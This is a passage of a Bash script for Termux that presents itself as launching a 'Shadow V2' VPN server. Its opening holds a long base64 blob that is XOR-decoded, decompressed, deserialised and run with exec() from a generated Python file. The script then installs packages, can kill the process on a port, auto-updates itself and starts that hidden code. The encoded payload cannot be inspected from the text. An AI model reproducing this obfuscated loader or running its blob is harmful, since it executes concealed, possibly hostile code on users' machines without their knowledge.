zfQAOSmU9Qn3rT7yxI+V7s+SrMA7Ot0buR93EDRrMXtTAxrLwiglr0WnPrdOzWJ7b0FaPo51PlFn7xjXx00S0+oKp6g+UCRJIe5m6n07rpuqpFCI3FFEdxteRCa6E794k7r3/TejubWnfBWsGNYbqlae0hti+pKydGVH8giuoJSrbCEJRdsdaO07FJ4Tw4QqTMn/zESYaBtxK+I/WLsIF3yH8ZZgR5n2gSj2blpe02eUIpN60uWf+dpkWEtcUSAxL4juQGd2566E01ABKDhmpObK/BwCEWvzvk0OutCQ86kco0srLllV9U39eYCB1Bs1Zytnfdf1fLKALDIQFYbVLNWqZjjzdOM3cXwPFlq/592pqWYLyqrPW6Wqo/gHCLMZcorHcUC11HSUktSB/g4dq/eip2XQ6P3JieBrX3WxG3QyMtgMczAizxnqfWT5PSbpuGRnY0bUOuf2bTT9jHsOkFsjW1AO1GcGcMefVHtgXom5jSbDGlxJCH3633F1OL0Winr58EeYLPA6cqaBvo1oqdXryv2ROCQVlOS2bXu5WJnCwbUa9ekDtMb5d7P4DCP8ik2e+e+/8Nnr02to+CWeDAAgxk857vDarHG150ErFK8VBScIBbvrEx3h/k2lQaNQZJstAwJs1OpNRzyx8DamG3eBe1R46cfkvrYej2qKDUiQnuPdKfEOMDzoPlT6HIn50IFxa8p1SRSqAOsGZonAhVgzbQ7WxX0H11XedJvQlrThRQ5u4Dt/6EZne+PnoQvPNM6b37F/HXQ9BNe8M5rFUdcKTRISciDkec/RNJ7IatYTBgaycGNK9yDoXhYgAU5GFqrqkA3Ru9lutbu1T9+yjPMH19DuVaE+TS0eXE0w5688J5TBNZQ6Veu0HoXUB8vVz3plPhHLg870pBFt/firUFI8q3mgtMuKn5vm//uMAKANmd+6T5zg/1u3X9GBR/Tg0J6Muro6d9CM7vgbJyMwKXmPV/ckv67KA32UrqRQx9V5TMkeAZtRF44yHJhLvxL2FMdLwz7UsZ0DeV0q/Wf5oz2ys+i8qFzWGs8aRrRI0D+dMVszlg9by2m+fNrm/WX0njzogqM55/EjcksaPjDuta2H5lPmr5mSvJhJxugjYLa3pgtVZLrwcG9AgjAYcpz2vE5zCTw7X53JzNuRxOnQ1LZ1SnF3zcAZ6e8Uc3j03nPGnYvkBN4E+gWgMq46qYJqTklM1TEI/h03r5asJ/i9W8KrmRfDeu6ApZr7nEO9ZHyRq4aqxYoSDXmabRDpzYFqvGhrWhw6AufnD20pGWpgLRx37ZnNhSFL/5bwe682xKNuUyFAZ210x3o/KF0AnT/Q7IytaT2/AY1ZZU19TcqVDJ1u1KzhPLzu+U3tHGx82QkyVpS6iiGVyL8pTs07LDbqn7nferrIHJ7fDIpa/yQzHMV5eEu8Fi8X+w/nxTkpQWFddHjYjegqnzlJ2kaJ5Pa+sz/Tz9tjf/RbZ1xf2YV0AvezW3S+toSkeXgX0pRSigXGRtnJGaWTPGFlJtruxhwE7XLW9xT6mUx0JdBEyKOZb/OyCsa7ormDSUKAxDIPEwzi8L/KsvP3AnNB0EJC7BoAN+HgUTGwIwFw3dlBFSEoQPCcWMCTqIBC8GI3TjAigfvnz6y3r6/9X2/v7HMvf67+uJrOAqU+jr/gX63iLk1MK+w+FbwtuQ3tbS+LPT2ojVToHPicPZhEfPbcThAsEUv599g8E6vtCNdrXGuFC+rCevttyqca54prFloP8irqQfkcWcqlqYmleR2bST7tFAjIidcAuL3YiYBoOKY4PhgHwWvX0OcVVxI+aqdE/S8+4vau2Q6WMtxw==')
Wdsstm = bytes([b ^ ((mzsXSf + i) % 255) for i, b in enumerate(BmIDIY)])
exec(XtEnCD.loads(uspHoJ.decompress(Wdsstm)))

EOF
        # FIN DEL BLOQUE PYTHON PROTEGIDO V2
        
        log_msg "SUCCESS" "$VERDE" "Núcleo materializado con cifrado SHADOW V2."
    fi
}

# --- 2. VERIFICACIÓN DE ENTORNO ---
check_env() {
    log_msg "SETUP" "$AMARILLO" "Verificando entorno de ejecución..."
    
    # Python
    if ! command -v python3 &> /dev/null; then
        log_msg "INSTALL" "$AMARILLO" "Instalando Python3..."
        pkg install python3 -y
    fi

    # Cryptography
    if ! python3 -c "import cryptography" &> /dev/null; then
        log_msg "INSTALL" "$CYAN" "Instalando librería 'cryptography'..."
        if ! pkg install python-cryptography -y; then
             log_msg "WARN" "$AMARILLO" "Fallo nativo. Intentando compilación..."
             pkg install build-essential openssl libffi rust binutils -y
             pip install cryptography
        fi
    fi
}

# --- 3. EJECUCIÓN ---
auto_update "$@"
clear
echo -e "${CYAN}   ___  ___  _  __   ___  ___  ___ ${NC}"
echo -e "${CYAN}  / _ \/ _ \/ |/ /  / _ \/ _ \/ _ |${NC}"
echo -e "${CYAN} / // / ___/    /  / // / ___/ __ |${NC}"
echo -e "${CYAN}/____/_/   /_/|_/  /____/_/   /_/ |_|${NC}"
echo -e "${CYAN}       SHADOW INFRASTRUCTURE       ${NC}"
echo ""

generate_payload
check_env
check_ip_range_ifconfig
log_msg "LAUNCH" "$VERDE" "Iniciando Servidor VPN SDC (Shadow V2)..."
echo -e "${CYAN}====================================================${NC}"
if port_in_use; then
    kill_port
fi
python3 "$SCRIPT_TARGET" --port "$PORT"
